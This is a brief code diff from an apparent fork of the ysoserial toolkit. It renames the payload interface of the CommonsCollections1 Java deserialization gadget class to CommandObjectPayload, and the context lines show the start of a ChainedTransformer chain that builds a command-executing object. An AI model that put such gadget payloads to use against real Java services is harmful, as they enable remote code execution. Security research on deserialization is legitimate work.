@@ -10,7 +10,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Gadgets;
@@ -42,7 +42,8 @@ import com.h2tg.ysogate.utils.Reflections;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.FROHOFF})
-public class CommonsCollections1 implements ObjectPayload<InvocationHandler> {
+public class CommonsCollections1 implements CommandObjectPayload<InvocationHandler>
+{
 
 	public InvocationHandler getObject(final String command) throws Exception {
 		final Transformer transformerChain = new ChainedTransformer(
